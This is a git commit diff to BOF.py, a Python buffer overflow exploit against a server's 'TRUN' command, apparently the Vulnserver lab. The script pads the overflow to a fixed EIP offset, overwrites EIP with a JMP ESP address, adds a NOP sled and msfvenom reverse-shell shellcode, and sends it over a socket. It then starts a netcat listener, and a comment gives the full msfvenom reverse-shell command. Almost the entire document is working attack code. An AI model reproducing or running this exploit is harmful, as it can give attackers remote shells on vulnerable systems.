7cf8a405f30d63c9e85120cb10241e5fcfdc8860
root <root@kali>
2022-01-23 03:38:25 -0500

    automated BOF script with automatic listener and shellcode parsing

--- BOF.py
+++ BOF.py
@@ -1,16 +1,18 @@
 #!/usr/bin/python3
 
-import sys,socket,argparse,subprocess
+import sys,socket,argparse,subprocess,re,os
 from pwn import p32
+
+#####################################################################SETUP######################################################################################
 
 
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address')
-    parser.add_argument('-p','--port',dest = 'port',help = 'Enter target port. Default set to 9999')
-    parser.add_argument('-c','--cmd',dest = 'cmd',help = 'Enter the name of server command being exploited. Default set to: \'TRUN /.:/\'')
-    parser.add_argument('-o','--offset', dest = 'offset',help='Perform a manual search for EIP after BOF. Use pattern-offset meatsploit tool to find this offset. Default set to 2003' )
-    parser.add_argument('-lp','local port',dest = 'lp',help = 'Enter call back port of attacker machine. Default set to port: 1337')
+    parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port. Default set to 9999')
+    parser.add_argument('-c','--cmd',dest = 'cmd', help = 'Enter the name of server command being exploited. Default set to: \'TRUN /.:/\'')
+    parser.add_argument('-o','--offset', dest = 'offset', help='Perform a manual search for EIP after BOF. Use pattern-offset meatsploit tool to find this offset. Default set to 2003' )
+    parser.add_argument('-lp','--local port',dest = 'lp', help = 'Enter call back port of attacker machine. Default set to port 1337. Netcat listener start automatically in a new gnome terminal. $~apt install gnome-terminal')
     parser.set_defaults(cmd = 'TRUN /.:/')
     parser.set_defaults(port = 9999)
     parser.set_defaults(offset = 2003)
@@ -19,16 +21,26 @@ def get_args():
     return options
 
 
-def get_payload(ip,port):
-    pipecmd_pl = ('msfvenom -p windows/shell_reverse_tcp LHOST="{}" LPORT={} EXITFUNC=thread -f c -a x86 -b "\\x00"'.format(ip,port))
+def buf():
+    pipecmd_pl = input('Enter msfvenom shellcode command with --format py > buf.py:')
     print(f'{fc.y}Generating payload please wait...{fc.end}')
-    return subprocess.check_output(pipecmd_pl,shell = True)
+    subprocess.check_output(pipecmd_pl,shell=True)
+    from buf import buf
+    return buf
+
 
 def get_ip():
     pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
     ip = subprocess.check_output(pipecmd_ip,shell=True)
     ip_decoded = ip.decode('utf-8')
     return ip_decoded
+
+
+def start_nc():
+    command = 'nc -lvnp {}'.format(opt.lp)
+    return os.system("gnome-terminal -e 'bash -c \""+command+";bash\"'")
+
+
 #######################################################################COLOR####################################################################################  
 
 
@@ -53,25 +65,30 @@ opt = get_args()
 ip = get_ip()
 overflow = opt.cmd + 'A' * opt.offset
 overflow = overflow.encode()
-padding   = b'\x90' * 30 
+padding   = b'\x90' * 32 
 jmpesp = p32(0x625011af)
 timeout = 5 # s.connect timeout
-payload = get_payload(ip,opt.lp)
-payload = payload.encode() if isinstance(payload, str) else payload
-buffer = overflow + jmpesp + padding + payload
+buf = buf()
+buffer = overflow + jmpesp + padding + buf
 
 
 print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}')
+
+###################################################################RUN###########################################################################################
+
+#msfvenom -p windows/shell_reverse_tcp LHOST="192.168.241.133" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py
 try:
-    print(f'{fc.b}Connecting to target...{fc.end}')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((str(opt.ip), opt.port))
-    print(f'{fc.b}Connected to target.{fc.end}')
-    print(f'{fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
     s.send(buffer)
-    print(f'{fc.r}Payload sent.{fc.end}')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Payload sent.{fc.end}')
+    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
+    
     s.close()
-
+    start_nc()
 
 except Exception as e:
         print(f'\tError: {fc.rw}{e}{fc.end}')
@@ -80,4 +97,3 @@ except Exception as e:
 
 except KeyboardInterrupt:
         print('Abort')
-        
